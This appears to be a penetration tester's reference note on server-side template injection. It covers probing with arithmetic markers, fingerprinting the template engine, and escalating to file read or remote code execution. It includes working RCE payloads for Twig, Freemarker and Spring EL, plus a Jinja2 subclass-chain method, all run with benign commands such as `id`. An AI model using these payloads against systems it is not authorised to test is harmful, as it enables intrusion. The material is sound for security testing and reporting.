# Server-side template injection

**When:** a request value is rendered by a template engine server-side.
Signals: user input in page templates, email/pdf generators, error pages
that echo input, `render_template_string`, freemarker/velocity stacks.

`probe_ssti` sends `{{7*7}}`, `<%= 7*7 %>`, `${7*7}`, `${{7*7}}` and checks
for `49` in the response without the raw payload being reflected.

## Engine fingerprint (send, read result)

| Payload | Result 49 means |
|---|---|
| `{{7*7}}` | Jinja2, Twig, Nunjucks, many |
| `{{7*'7'}}` -> `7777777` | Jinja2 (string mul) |
| `{{7*'7'}}` -> `49` | Twig |
| `${7*7}` | Freemarker, Velocity, Spring EL |
| `<%= 7*7 %>` | ERB, EJS |
| `#{7*7}` | Thymeleaf/Spring EL, some Ruby |

## From detection to impact

- Jinja2: `{{ config }}` leaks settings -> `{{ ''.__class__.__mro__ }}` chain
  -> subclasses -> `__subclasses__()` -> file read or RCE via
  `cycler`/`joiner`/`namespace` gadgets (indexes differ per version - fetch
  `{{ ''.__class__.__mro__[1].__subclasses__() }}` and read the index list,
  do not guess numbers from memory).
- Twig: `{{_self.env}}`, `{{app}}`; RCE via `{{['id']|filter('system')}}` variants.
- Freemarker: `${"freemarker.template.utility.Execute"?new()("id")}`.
- Thymeleaf/Spring EL: `#{T(java.lang.Runtime).getRuntime().exec('id')}`.

For a professional report, file-read or a benign command output (`id`,
`hostname`) is enough to prove RCE - do not drop shells on a shared app.

## Sandbox and errors

Template engines error loudly: a 500 with engine names (`jinja2`,
`twig`, `freemarker`) is itself recon. Sandboxed engines (Smarty
`secure_mode`, Jinja `SandboxedEnvironment`) need escape gadgets - note the
sandbox and rate accordingly.

## Falsifier

All marker payloads reflect literally (raw `{{7*7}}` in output) or are
rejected - nothing evaluates to 49.

## Severity guide

Arithmetic eval confirmed: medium baseline. Data/config disclosure: high.
RCE proven with benign command: critical.
